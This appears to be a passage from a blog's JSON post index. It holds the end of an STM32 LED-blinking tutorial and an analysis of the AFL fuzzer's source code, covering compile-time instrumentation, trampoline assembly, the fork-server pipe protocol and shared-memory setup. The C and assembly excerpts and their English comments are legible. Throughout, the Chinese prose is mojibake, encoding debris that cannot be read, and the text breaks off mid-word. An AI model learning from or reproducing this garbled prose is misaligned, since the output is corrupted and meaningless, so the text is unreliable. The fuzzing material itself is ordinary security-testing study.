ï¼ˆå…¶å®æ˜¯æƒ³éªŒè¯ä¸‹å‘çš„èŠ¯ç‰‡æ˜¯ä¸æ˜¯å¥½çš„ï¼‰","text":"å¦‚ä½•ä¸‰å°æ—¶ä¹‹å†…ï¼Œä»0å¼€å§‹å­¦ä¼šstm32ç‚¹ç¯ ï¼ˆå…¶å®æ˜¯æƒ³éªŒè¯ä¸‹å‘çš„èŠ¯ç‰‡æ˜¯ä¸æ˜¯å¥½çš„ï¼‰ å‡†å¤‡å·¥ä½œ æˆ‘æ˜¯åœ¨JDä¸Šéšä¾¿ä¹°çš„ä¸€å®¶ï¼Œæœ‰ STM32F103C8T6ï¼Œé¢åŒ…æ¿ï¼ŒUSBè½¬TTLï¼Œæ˜¾ç¤ºå™¨â€¦ ç¼ºå•¥å°‘å•¥ä¹°é…ä»¶å°±è¡Œäº† 1.è½¯ä»¶ ç”±äºæˆ‘ä»¬æ˜¯å°ç™½ï¼Œæ‰€ä»¥æš‚æ—¶ä¸éœ€è¦çœ‹ç”µè·¯å•¥çš„ï¼Œç›´æ¥å…ˆæŠŠè½¯ä»¶è£…ä¸Šã€‚ STM32CubeIDE è¿™é‡Œæˆ‘å‚è€ƒäº†ï¼šBV1HM411b78E æˆ–è€…çŸ¥ä¹çš„https://zhuanlan.zhihu.com/p/321845090 çŸ¥ä¹çš„æœ‰ä¸€ä¸ªæ¨¡æ‹Ÿç¨‹åº é©±åŠ¨ï¼ˆå› ä¸ºæˆ‘æ˜¯USBè½¬TTLï¼‰ï¼šCH340-é©±åŠ¨ï¼Œè¿™ä¸ªä½ å¯ä»¥æ‰¾å®¢æœè¦ï¼Œä¸€èˆ¬éƒ½ä¼šå‘ç»™ä½ çš„ çƒ§å½•è½¯ä»¶ï¼šFLYMCU é¦–å…ˆéœ€è¦ç†Ÿæ‚‰çš„å°±æ˜¯STM32CubeIDEçš„ä½¿ç”¨ï¼Œå¯ä»¥å‚è€ƒä¸Šé¢çš„Bç«™è§†é¢‘åè€…çŸ¥ä¹ï¼Œè¿™é‡Œè¿˜æœ‰ï¼šhttps://www.bilibili.com/video/BV13B4y1y7yk 2.ç¡¬ä»¶ è¿™ä¸ªæ˜¯å§‹ç»ˆç»•ä¸å¼€çš„ï¼ˆé™¤éä½ ç”¨EDAï¼‰ 1.é¢åŒ…æ¿ æœ‰æ—¶é—´å¯ä»¥å‚è€ƒï¼šhttps://www.bilibili.com/video/BV1gz4y1Z7N7 æˆ–è€… å¯¼çº¿å°±æ˜¯è¿™æ ·è¿æ¥çš„ 2.STM32F103C8T6 æ˜¾ç¤ºå†IDEä¸­çš„ æ¯”å¦‚è¿™é‡Œçš„PA0å°±æ˜¯ä»£è¡¨èŠ¯ç‰‡çš„A0æ¥å£ è¿™é‡Œçš„GPIO_Outputä»£è¡¨çš„æ˜¯ä¿¡å·è¾“å‡ºï¼ˆä¸¥æ ¼æ¥è¯´ä¸æ˜¯è¿™æ ·çš„ï¼‰ã€‚å…·ä½“çš„è®¾ç½®å¯ä»¥å‚è€ƒhttps://www.bilibili.com/video/BV1ja411J766 åœ¨main.cä¸­çš„mainå‡½æ•°çš„whileæ­»å¾ªç¯é‡Œé¢æœ‰ 1234567891011/* Infinite loop *//* USER CODE BEGIN WHILE */while (1)&#123; /* USER CODE END WHILE */ HAL_GPIO_TogglePin(GPIOA, LED1_Pin); HAL_Delay(200); HAL_GPIO_TogglePin(GPIOA, LED2_Pin); HAL_Delay(200); /* USER CODE BEGIN 3 */&#125; LED1_Pinå’ŒLED2_Pinæ˜¯æˆ‘ç»™çš„å‘½åï¼Œç„¶åç¼–è¯‘å°±å¥½äº† 3.çƒ§å½• å¯ä»¥å‚è€ƒ https://www.bilibili.com/video/BV1wR4y1y7E2/ https://www.bilibili.com/video/BV1P24y1L7Ho PA9&lt;â€“&gt;RXD PA10&lt;â€“&gt;TXD è®¾ç½®æ¡çº¿ï¼š å¼€å§‹FLYMCUçƒ§å½• é€‰hexæ–‡ä»¶çƒ§è¿›å»å°±è¡Œäº† å¦‚æœä½ åƒæˆ‘ä¸Šå›¾é‚£æ ·å¤–æ¥ç”µæºï¼Œåœ¨çƒ§å½•çš„æ—¶å€™ä¹Ÿæ˜¯éœ€è¦å°†å…¶æ’å…¥USBæ¥å£ä¸­çš„ 3.ç”µè·¯ ä¸çŸ¥é“äºŒæç®¡åŠŸç‡çš„æœ€å¥½åŠ ä¸Š1kæ¬§çš„ç”µé˜»ï¼Œä¿¡å·æ—¶ä»A0å’ŒA1è¾“å‡ºï¼Œæœ€åæµå‘çš„æ˜¯Gè·³çº¿ï¼ˆå‚è€ƒä¸Šå›¾ï¼‰ è°ƒå›bootæ¡çº¿ï¼ŒæŒ‰ä¸‹å¤ä½é”®ï¼š æˆåŠŸç‚¹äº®","categories":[{"name":"hardware","slug":"hardware","permalink":"https://joe1sn.eu.org/categories/hardware/"}],"tags":[{"name":"stm32","slug":"stm32","permalink":"https://joe1sn.eu.org/tags/stm32/"}]},{"title":"ã€æºç åˆ†æã€‘AFLæºä»£ç åˆ†æ","slug":"afl-source","date":"2023-07-22T00:41:03.000Z","updated":"2024-01-10T04:45:48.085Z","comments":true,"path":"2023/07/22/afl-source/","link":"","permalink":"https://joe1sn.eu.org/2023/07/22/afl-source/","excerpt":"å…¶å®è¿˜æ˜¯æŒºç®€å•çš„","text":"å…¶å®è¿˜æ˜¯æŒºç®€å•çš„ åœ¨ä¸€æ¬¡æœŸæœ«æŠ¥å‘Šé‡Œé¢åšäº†è¿™ä¸ªæŠ¥å‘Š å…³äºAFLçš„åŸºæœ¬æ­¥éª¤ å·¥ä½œæµç¨‹åŸºæœ¬ä¸Šå¯ä»¥ç”¨ 5 ä¸ªæ­¥éª¤æ¥æè¿°ï¼šé¢„å¤„ç†ã€è¾“å…¥æ„å»ºã€è¾“å…¥é€‰æ‹©ã€è¯„ä¼°ã€åæ¨¡ç³Šæµ‹è¯•ã€‚ çœŸæ­£çš„å†…æ ¸å¤„ç†æ˜¯æ­¥éª¤ 2 åˆ° 4 é¢„å¤„ç† åˆ†æå’Œè·å–æœ‰ç”¨ä¿¡æ¯ï¼Œä½¿ç”¨PINï¼Œç¬¦å·æ‰§è¡Œï¼Œæ±¡ç‚¹æ£€æŸ¥ é»‘ç›’ç™½ç›’ è¾“å…¥æ„å»º ä»æ•°æ® Sï¼ˆç§å­ï¼‰äº§ç”Ÿå¤§é‡å˜å¼‚æ•°æ® Iã€‚ è¾“å…¥é€‰æ‹© è¿‡æ»¤æ— æ•ˆæ•°æ®ï¼Œä¼˜åŒ–æ¨¡ç³Šæµ‹è¯• è¯„ä¼° å¤§å¤šæ•°å…³äºæ¨¡ç³Šçš„ç ”ç©¶é›†ä¸­åœ¨ä¸¤ä¸ªæŒ‡æ ‡ä¸Šï¼šè¦†ç›–ç‡å’Œåˆ©ç”¨æ¼æ´çš„å¹³å‡æ—¶é—´ æºç åˆ†æ ç¼–è¯‘æ’æ¡© afl-gcc æ ¹æ®ä½¿ç”¨æ–¹æ³•ï¼Œé¦–å…ˆæ˜¯ä½¿ç”¨afl-gccè¿›è¡Œç¼–è¯‘ï¼Œåœ¨ç¼–è¯‘æ—¶å°±å®Œæˆæ’æ¡© æœ¬å°±æ˜¯æ˜¯åŒ…è£¹çš„GCCç›’CLANG 12345678910111213141516171819202122232425262728293031323334353637int main(int argc, char** argv) &#123; if (isatty(2) &amp;&amp; !getenv(&quot;AFL_QUIET&quot;)) &#123; SAYF(cCYA &quot;afl-cc &quot; cBRI VERSION cRST &quot; by &lt;lcamtuf@google.com&gt;\\n&quot;); &#125; else be_quiet = 1; if (argc &lt; 2) &#123; SAYF(&quot;\\n&quot; &quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\\n&quot; &quot;for gcc or clang, letting you recompile third-party code with the required\\n&quot; &quot;runtime instrumentation. A common use pattern would be one of the following:\\n\\n&quot; &quot; CC=%s/afl-gcc ./configure\\n&quot; &quot; CXX=%s/afl-g++ ./configure\\n\\n&quot; &quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\\n&quot; &quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\\n\\n&quot;, BIN_PATH, BIN_PATH); exit(1); &#125; find_as(argv[0]); edit_params(argc, argv); execvp(cc_params[0], (char**)cc_params); FATAL(&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;, cc_params[0]); return 0;&#125; SAYFå°±æ˜¯fprintfå‡½æ•°ï¼Œæ£€æµ‹åˆ°å‚æ•°å°äº2çš„æ—¶å€™æŠ¥é”™å¹¶é€€å‡º ä½¿ç”¨find_asè¿›è¡Œå‚æ•°çš„è§£æåˆ°è‡ªèº«ç¨‹åºè·¯å¾„ï¼Œæ‰¾åˆ°afl-asçš„aflæ±‡ç¼–å™¨ edit_paramsä¸­ï¼Œè§£æå‚æ•°ï¼Œè®¾ç½®è‡ªç”Ÿå¯¹åº”çš„ç¼–è¯‘å™¨ï¼Œè·å¾—å’Œè®¾ç½®ä¸€ç³»åˆ—ç¯å¢ƒå˜é‡ï¼Œæœ€åå¾—åˆ°çš„cc_paramså°±æ˜¯ç¼–è¯‘å‚æ•° execvp(cc_params[0], (char**)cc_params);ï¼Œé€šè¿‡å‰é¢æ‰¾åˆ°çš„æ±‡ç¼–å™¨as_pathå’Œå‚æ•°åˆ›å»ºè¿›ç¨‹è¿›è¡Œæ’æ¡©ç¼–è¯‘ã€‚ï¼ˆå…·ä½“å°±æ˜¯æ›¿æ¢äº†ç¨‹åºåç§°ä¹‹ç±»çš„ï¼Œæºç å¾ˆç®€å•ï¼‰ afl-as main è¿›å…¥mainåˆ›å»ºäº†ä¸€äº›åˆ—å˜é‡ç„¶åå°±æ˜¯åœ¨a ä¸­å°† cc_params è½¬ä¸ºas_params add_instrumentation é‡å¤´å‡½æ•° 1234567891011121314151617181920while (fgets(line, MAX_LINE, inf)) &#123; /* In some cases, we want to defer writing the instrumentation trampoline until after all the labels, macros, comments, etc. If we&#x27;re in this mode, and if the line starts with a tab followed by a character, dump the trampoline now. */ if (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp; instrument_next &amp;&amp; line[0] == &#x27;\\t&#x27; &amp;&amp; isalpha(line[1])) &#123; fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE)); instrument_next = 0; ins_lines++; &#125; .... ....&#125; æ‰€ä»¥ï¼ŒAFLçš„ä»£ç æ’æ¡©ï¼Œå°±æ˜¯åœ¨å°†æºæ–‡ä»¶ç¼–è¯‘ä¸ºæ±‡ç¼–ä»£ç åï¼Œé€šè¿‡afl-aså®Œæˆã€‚å¼€å§‹é‡å†™æ±‡ç¼–æŒ‡ä»¤ï¼Œå‡†å¤‡åœ¨åˆ†æ”¯å¤„æ’å…¥ä»£ç  å…ˆçœ‹çœ‹32ä½ï¼Œ64ä½å’Œè¿™ä¸ªä¹Ÿå·®ä¸å¤š trampoline_fmt_32 12345678910111213141516171819202122static const u8* trampoline_fmt_32 = &quot;\\n&quot; &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\\n&quot; &quot;\\n&quot; &quot;.align 4\\n&quot; &quot;\\n&quot; &quot;leal -16(%%esp), %%esp\\n&quot; &quot;movl %%edi, 0(%%esp)\\n&quot; &quot;movl %%edx, 4(%%esp)\\n&quot; &quot;movl %%ecx, 8(%%esp)\\n&quot; &quot;movl %%eax, 12(%%esp)\\n&quot; &quot;movl $0x%08x, %%ecx\\n&quot; &quot;call __afl_maybe_log\\n&quot; &quot;movl 12(%%esp), %%eax\\n&quot; &quot;movl 8(%%esp), %%ecx\\n&quot; &quot;movl 4(%%esp), %%edx\\n&quot; &quot;movl 0(%%esp), %%edi\\n&quot; &quot;leal 16(%%esp), %%esp\\n&quot; &quot;\\n&quot; &quot;/* --- END --- */\\n&quot; &quot;\\n&quot;; è¿™å°±æ˜¯æ±‡ç¼–ï¼Œå¬chatGPTè¯´ 12345678910111213141516section .textglobal _start_start: lea esp, [esp-16] ; leal -16(%esp), %esp mov [esp], edi ; movl %edi, 0(%esp) mov [esp+4], edx ; movl %edx, 4(%esp) mov [esp+8], ecx ; movl %ecx, 8(%esp) mov [esp+12], eax ; movl %eax, 12(%esp) mov ecx, 0x08000000 ; movl $0x%08x, %ecx call __afl_maybe_log ; call __afl_maybe_log mov eax, [esp+12] ; movl 12(%esp), %eax mov ecx, [esp+8] ; movl 8(%esp), %ecx mov edx, [esp+4] ; movl 4(%esp), %edx mov edi, [esp] ; movl 0(%esp), %edi lea esp, [esp+16] ; leal 16(%esp), %esp 32ä½æ˜¯ç»å…¸çš„æ ˆä¼ å‚ï¼Œè¿™é‡Œä½¿ç”¨å¯¹espçš„ç§»åŠ¨å®ç°äº†ä»edi edx ecx eaxçš„ä¿å­˜ï¼Œç„¶ååˆå°†ecxè®¾ç½®ä¸ºäº†0x08000000ï¼Œè¿™ä¸ªæ˜¯chatGPTç¿»è¯‘é”™äº†ï¼Œæ­£ç¡®çš„ç†è§£æ˜¯&quot;%08x&quot; æ˜¯æ ¼å¼è¯´æ˜ç¬¦ï¼Œç”¨äºå°†ä¸€ä¸ªæ•´æ•°æ ¼å¼åŒ–ä¸ºä¸€ä¸ªå¸¦æœ‰å‰å¯¼é›¶çš„ 8 ä½åå…­è¿›åˆ¶æ•°ã€‚ä¾‹å¦‚ï¼Œâ€œ%08xâ€ å°†æŠŠæ•°å­— 10 æ ¼å¼åŒ–ä¸º â€œ0000000Aâ€ã€‚è¿™æ®µæ±‡ç¼–ä»ç„¶æ˜¯å±äºCè¯­è¨€çš„èŒƒç•´ã€‚ ä¼¼ä¹æˆ‘ä»¬ä¸‹ä¸€æ­¥è¦çœ‹çš„æ˜¯__afl_maybe_logï¼Œ**ä½†æ˜¯ä½ å°±æ²¡æƒ³è¿‡R(MAP_SIZE)**æœ‰ä»€ä¹ˆç”¨å—ï¼ŸR(x)çš„å®šä¹‰æ˜¯(random() % (x))ï¼Œæ‰€ä»¥R(MAP_SIZE)å³ä¸º0åˆ°MAP_SIZEä¹‹é—´çš„ä¸€ä¸ªéšæœºæ•°ã€‚ å› æ­¤ï¼Œåœ¨å¤„ç†åˆ°æŸä¸ªåˆ†æ”¯ï¼Œéœ€è¦æ’å…¥æ¡©ä»£ç æ—¶ï¼Œafl-asä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½œä¸ºè¿è¡Œæ—¶ä¿å­˜åœ¨ecxä¸­çš„å€¼ã€‚è€Œè¿™ä¸ªéšæœºæ•°ï¼Œä¾¿æ˜¯ç”¨äºæ ‡è¯†è¿™ä¸ªä»£ç å—çš„keyã€‚ æ¥ä¸‹æ¥æ¥åˆ°__afl_maybe_log è¿è¡Œ å¼€å§‹fuzzï¼Œé‚£ä¹ˆaflå¦‚ä½•å¯åŠ¨è¿™ä¸ªç¨‹åºï¼Œå¯ä»¥çœ‹çœ‹afl-fuzz.cï¼Œä¸è¿‡æœ€å¼€å§‹åä¸–è®¾ç½®å‚æ•°ï¼Œè¿™é‡Œå°†é‡è¦ç‚¹çš„éƒ¨åˆ†ã€‚ è°ƒç”¨çš„é“¾æ¡æœ‰ç‚¹å¤æ‚é¦–å…ˆåœ¨L8044 1skipped_fuzz = fuzz_one(use_argv); ç„¶åçš„fuzz_oneä¸­ï¼Œä½¿ç”¨é˜Ÿåˆ—queue_curæ¥ç®¡ç† 1res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - 1, 0); åœ¨calibrate_case 12if (dumb_mode != 1 &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid) init_forkserver(argv); æ€»ç®—æ˜¯æ‰¾åˆ°äº† ä¸ºäº†æ›´é«˜æ•ˆåœ°è¿›è¡Œä¸Šè¿°è¿‡ç¨‹ï¼ŒAFLå®ç°äº†ä¸€å¥—fork serveræœºåˆ¶ã€‚å…¶åŸºæœ¬æ€è·¯æ˜¯ï¼šå¯åŠ¨targetè¿›ç¨‹åï¼Œtargetä¼šè¿è¡Œä¸€ä¸ªfork serverï¼›fuzzerå¹¶ä¸è´Ÿè´£forkå­è¿›ç¨‹ï¼Œè€Œæ˜¯ä¸è¿™ä¸ªfork serveré€šä¿¡ï¼Œå¹¶ç”±fork serveræ¥å®ŒæˆforkåŠç»§ç»­æ‰§è¡Œç›®æ ‡çš„æ“ä½œã€‚è¿™æ ·è®¾è®¡çš„æœ€å¤§å¥½å¤„ï¼Œå°±æ˜¯ä¸éœ€è¦è°ƒç”¨execve()ï¼Œä»è€ŒèŠ‚çœäº†è½½å…¥ç›®æ ‡æ–‡ä»¶å’Œåº“ã€è§£æç¬¦å·åœ°å€ç­‰é‡å¤æ€§å·¥ä½œ L1987 123int st_pipe[2], ctl_pipe[2];....forksrv_pid = fork(); ä½¿ç”¨pipeå’Œforkserverè¿›è¡Œé€šè®¯ L2088çš„ä½ç½®å¼€å§‹æ‰§è¡Œexecv(target_path, argv);ã€‚å…¶å®çœ‹åˆ°è¿™é‡Œæˆ‘ä¹Ÿå¾ˆç–‘æƒ‘ä¸Šé¢çš„è§£é‡Š åœ¨L2103ä¸­æµ‹è¯•å’Œforkserverçš„é€šè®¯ 1234567891011 fsrv_ctl_fd = ctl_pipe[1]; fsrv_st_fd = st_pipe[0]; rlen = read(fsrv_st_fd, &amp;status, 4);... /* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set. Otherwise, try to figure out what went wrong. */ if (rlen == 4) &#123; OKF(&quot;All right - fork server is up.&quot;); return; &#125; æ¥ä¸‹æ¥çš„fork serveræ˜¯å¦‚ä½•ä¸fuzzeré€šä¿¡æ˜¯é¢è¯•è€ƒç‚¹ï¼ˆ/dogeï¼‰ forkserver çŸ¥é“åˆ›å®‡ä¸çŸ¥é“æ˜¯è®²çš„å¤ªç¢äº†è¿˜æ˜¯æˆ‘ç†è§£æœ‰é—®é¢˜ï¼Œåœ¨è¿™é‡Œæˆ‘å°±ä¸æ€ä¹ˆè¿½çš„äº†ä»£ç äº†ï¼Œä¸è¿‡æƒ³èµ·å¼€å§‹è¯´è¿‡çš„ï¼šfuzzerå¹¶ä¸è´Ÿè´£forkå­è¿›ç¨‹ï¼Œè€Œæ˜¯ä¸è¿™ä¸ªfork serveré€šä¿¡ï¼Œå¹¶ç”±fork serveræ¥å®ŒæˆforkåŠç»§ç»­æ‰§è¡Œç›®æ ‡çš„æ“ä½œï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½å’Œæ’è¿›å»çš„__afl_maybe_logä¸€æ ·æ˜¯æ’å…¥å…¥è¿›å»äº†ä¸€ä¸ªforkserveråœ¨ä»£ç å½“ä¸­ï¼Œé‚£ä¹ˆå›åˆ°afl-asï¼ŒL446 12if (ins_lines) fputs(use_64bit ? main_payload_64 : main_payload_32, outf); ä¾ç„¶ä»¥32ä½ä¸¾ä¾‹å­main_payload_32 123456789101112131415161718192021&quot;__afl_forkserver:\\n&quot; &quot;\\n&quot; &quot; /* Enter the fork server mode to avoid the overhead of execve() calls. */\\n&quot; &quot;\\n&quot; &quot; pushl %eax\\n&quot; &quot; pushl %ecx\\n&quot; &quot; pushl %edx\\n&quot; &quot;\\n&quot; &quot; /* Phone home and tell the parent that we&#x27;re OK. (Note that signals with\\n&quot; &quot; no SA_RESTART will mess it up). If this fails, assume that the fd is\\n&quot; &quot; closed because we were execve()d from an instrumented binary, or because\\n&quot; &quot; the parent doesn&#x27;t want to use the fork server. */\\n&quot; &quot;\\n&quot; &quot; pushl $4 /* length */\\n&quot; &quot; pushl $__afl_temp /* data */\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot; /* file desc */\\n&quot; &quot; call write\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; cmpl $4, %eax\\n&quot; &quot; jne __afl_fork_resume\\n&quot; çœ‹æ³¨é‡Šä¹Ÿçœ‹çš„æ˜ç™½äº†ï¼Œç»™fuzzerè¯´å·²ç»å‡†å¤‡å®Œæ¯•ï¼Œå…¶ä¸­$__afl_tempå°±æ˜¯å››å­—èŠ‚é•¿åº¦çš„éªŒè¯ä¿¡æ¯ï¼Œç„¶åå¼€å§‹ç­‰å¾…å¾ªç¯ï¼Œè¯»å–å‘½ä»¤ç®¡é“ï¼Œç›´åˆ°fuzzeré€šçŸ¥å…¶å¼€å§‹ 123456789101112&quot;__afl_fork_wait_loop:\\n&quot;&quot;\\n&quot;&quot; /* Wait for parent by reading from the pipe. Abort if read fails. */\\n&quot;&quot;\\n&quot;&quot; pushl $4 /* length */\\n&quot;&quot; pushl $__afl_temp /* data */\\n&quot;&quot; pushl $&quot; STRINGIFY(FORKSRV_FD) &quot; /* file desc */\\n&quot;&quot; call read\\n&quot;&quot; addl $12, %esp\\n&quot;&quot;\\n&quot;&quot; cmpl $4, %eax\\n&quot;&quot; jne __afl_die\\n&quot; æœ‰é”™è¯¯å°±å¯„__afl_dieï¼Œé‚£ä¹ˆæˆåŠŸçš„è¯ 12345678910&quot; /* Once woken up, create a clone of our process. This is an excellent use\\n&quot;&quot; case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\\n&quot;&quot; caches getpid() results and offers no way to update the value, breaking\\n&quot;&quot; abort(), raise(), and a bunch of other things :-( */\\n&quot;&quot;\\n&quot;&quot; call fork\\n&quot;&quot;\\n&quot;&quot; cmpl $0, %eax\\n&quot;&quot; jl __afl_die\\n&quot;&quot; je __afl_fork_resume\\n&quot; å¾—åˆ°çˆ¶å­è¿›ç¨‹çš„IDï¼Œå¯¹å¾…å­è¿›ç¨‹èµ°åˆ°__afl_fork_resume 12345678910111213141516&quot;__afl_fork_resume:\\n&quot; &quot;\\n&quot; &quot; /* In child process: close fds, resume execution. */\\n&quot; &quot;\\n&quot; &quot; pushl $&quot; STRINGIFY(FORKSRV_FD) &quot;\\n&quot; &quot; call close\\n&quot; &quot;\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;\\n&quot; &quot; call close\\n&quot; &quot;\\n&quot; &quot; addl $8, %esp\\n&quot; &quot;\\n&quot; &quot; popl %edx\\n&quot; &quot; popl %ecx\\n&quot; &quot; popl %eax\\n&quot; &quot; jmp __afl_store\\n&quot; å¯¹äºå¤§äº0çš„è¿”å›å€¼ï¼ˆå³çˆ¶è¿›ç¨‹ï¼‰ä»–ç»§ç»­è¿è¡Œ 12345678910111213141516171819202122232425262728&quot; /* In parent process: write PID to pipe, then wait for child. */\\n&quot; &quot;\\n&quot; &quot; movl %eax, __afl_fork_pid\\n&quot; &quot;\\n&quot; &quot; pushl $4 /* length */\\n&quot; &quot; pushl $__afl_fork_pid /* data */\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot; /* file desc */\\n&quot; &quot; call write\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; pushl $0 /* no flags */\\n&quot; &quot; pushl $__afl_temp /* status */\\n&quot; &quot; pushl __afl_fork_pid /* PID */\\n&quot; &quot; call waitpid\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; cmpl $0, %eax\\n&quot; &quot; jle __afl_die\\n&quot; &quot;\\n&quot; &quot; /* Relay wait status to pipe, then loop back. */\\n&quot; &quot;\\n&quot; &quot; pushl $4 /* length */\\n&quot; &quot; pushl $__afl_temp /* data */\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot; /* file desc */\\n&quot; &quot; call write\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; jmp __afl_fork_wait_loop\\n&quot; ç»§ç»­è¿›è¡Œforkserverçš„ç®¡é“é€šè®¯ï¼Œç„¶å__afl_fork_wait_loopï¼Œ fuzzer å›é¡¾ä¸€ä¸‹ç›®å‰â€œæ ˆâ€çš„æƒ…å†µï¼šmain -&gt; calibrate_case -&gt; init_forkserver â€‹ å›é€€åˆ°calibrate_caseç»§ç»­æ‰§è¡Œï¼Œwrite_to_testcaseå°±æ˜¯è®¾ç½®æµ‹è¯•æ ·ä¾‹ï¼Œé‡ç‚¹åœ¨äºrun_targetã€‚AFLçš„æ–‡ä»¶ç¼–è¯‘ç­–ç•¥ä¸æ˜¯èƒ¡ä¹±å˜æ¢çš„ï¼Œä¸»è¦æ˜¯dumb_modeæœ‰æ²¡æœ‰è¢«å¼€å¯ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¸ä¼šå¼€å¯çš„ï¼Œé‚£ä¹ˆå°±æ¥åˆ°äº†L2362 12345678910111213141516171819202122 s32 res; /* In non-dumb mode, we have the fork server up and running, so simply tell it to have at it, and then read back PID. */ if ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, 4)) != 4) &#123; if (stop_soon) return 0; RPFATAL(res, &quot;Unable to request new process from fork server (OOM?)&quot;); &#125; if ((res = read(fsrv_st_fd, &amp;child_pid, 4)) != 4) &#123; if (stop_soon) return 0; RPFATAL(res, &quot;Unable to request new process from fork server (OOM?)&quot;); &#125; if (child_pid &lt;= 0) FATAL(&quot;Fork server is misbehaving (OOM?)&quot;);&#125; çœ‹æ³¨é‡Šå’Œä»£ç ï¼ŒçŸ¥é“é€šè¿‡ç®¡é“å‘forkserveré€šçŸ¥å‡†å¤‡å®Œæ¯•ï¼Œå¹¶å¾—åˆ°è¿”å›çš„PIDï¼Œç„¶åå°±æ˜¯L2438 123456789if (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123; kill_signal = WTERMSIG(status); if (child_timed_out &amp;&amp; kill_signal == SIGKILL) return FAULT_TMOUT; return FAULT_CRASH;&#125; fuzzerå†æ¬¡è¯»å–çŠ¶æ€ç®¡é“ï¼Œè·å–å­è¿›ç¨‹é€€å‡ºçŠ¶æ€ï¼Œå¹¶ç”±æ­¤æ¥åˆ¤æ–­å­è¿›ç¨‹ç»“æŸçš„åŸå› ï¼Œä¾‹å¦‚æ­£å¸¸é€€å‡ºã€è¶…æ—¶ã€å´©æºƒç­‰ï¼Œå¹¶è¿›è¡Œç›¸åº”çš„è®°å½• å…±äº«å†…å­˜æœºåˆ¶ è§£å†³ç¨‹åºæ’æ¡©å’Œå¯åŠ¨è¿è¡Œåï¼Œå°±æ¥åˆ°äº†å¯¹ç¤ºä¾‹çš„fuzzé˜¶æ®µã€‚åœ¨ç¨‹åºå¾…æµ‹è¯•éƒ¨åˆ†ï¼Œç¨‹åºå…ˆæ˜¯åˆå§‹åŒ–å˜å¼‚æ–¹å¼ã€‚AFLé€šè¿‡å…±äº«å†…å­˜æœºåˆ¶æ¥æ–¹ä¾¿é«˜å¹¶å‘çš„æ ·ä¾‹è¯»å–ï¼Œå‡å°IOçš„æŸè€—ã€‚ ä»£ç ä¸é•¿è¿™é‡Œè´´ä¸€ä¸‹ 12345678910111213141516171819202122232425262728293031EXP_ST void setup_shm(void) &#123; u8* shm_str; if (!in_bitmap) memset(virgin_bits, 255, MAP_SIZE); memset(virgin_tmout, 255, MAP_SIZE); memset(virgin_crash, 255, MAP_SIZE); shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); if (shm_id &lt; 0) PFATAL(&quot;shmget() failed&quot;); atexit(remove_shm); shm_str = alloc_printf(&quot;%d&quot;, shm_id); /* If somebody is asking us to fuzz instrumented binaries in dumb mode, we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending fork server commands. This should be replaced with better auto-detection later on, perhaps? */ if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1); ck_free(shm_str); trace_bits = shmat(shm_id, NULL, 0); if (!trace_bits) PFATAL(&quot;shmat() failed&quot;);&#125; åœ¨afl-fuzzçš„L7955æ¥åˆ°setup_shmï¼Œè¿™é‡Œè®¾ç½®å…±äº«å†…å­˜ï¼Œç„¶åä»shemget()ï¼ˆè¿™æ˜¯ä¸€ä¸ªLinuxCçš„å‡½æ•°ï¼‰è·å¾—ä¸€å—å†…å­˜ã€‚ shmget() returns the identifier of the System V shared memory segment associated with the value of the arguâ€ ment key. A new shared memory segment, with size equal to the value of size rounded up to a multiple of PAGE_SIZE, is created if key has the value IPC_PRIVATE or key isnâ€™t IPC_PRIVATE, no shared memory segment corâ€ responding to key exists, and IPC_CREAT is specified in shmflg. å­è¿›ç¨‹é€šè¿‡ç¯å¢ƒå˜é‡SHM_ENV_VARå¾—åˆ°å†…å­˜ï¼Œå¯¹äºfuzzeræœ¬èº«åˆ™ä¼šå›åˆ°trace_bitsä¿å­˜å†…å­˜åœ°å€ shmat() attaches the System V shared memory segment identified by shmid to the address space of the calling process. æˆ‘ä»¬åœ¨ä¸”å›åˆ°è¢«æµ‹è¯•çš„targetä¸­ï¼Œçœ‹ä¸‹ä»–è¢«æ’æ¡©çš„ä»£ç ï¼ˆæ—©äºä¹‹å‰çš„forkserverï¼‰ 123456&quot; /* Check if SHM region is already mapped. */\\n&quot; &quot;\\n&quot; &quot; movl __afl_area_ptr, %edx\\n&quot; &quot; testl %edx, %edx\\n&quot; &quot; je __afl_setup\\n&quot; &quot;\\n&quot; __afl_area_ptrï¼šå…±äº«å†…å­˜æ˜ å°„åˆ°targetçš„å†…å­˜ç©ºé—´ä¸­çš„åœ°å€ __afl_setupï¼šè·å–ç¯å¢ƒå˜é‡AFL_SHM_ENVçš„å†…å®¹å¹¶å°†å…¶è½¬ä¸ºæ•´å‹ï¼Œæœ€åï¼Œé€šè¿‡è°ƒç”¨shmat()ï¼Œtargetå°†è¿™å—å…±äº«å†…å­˜ä¹Ÿæ˜ 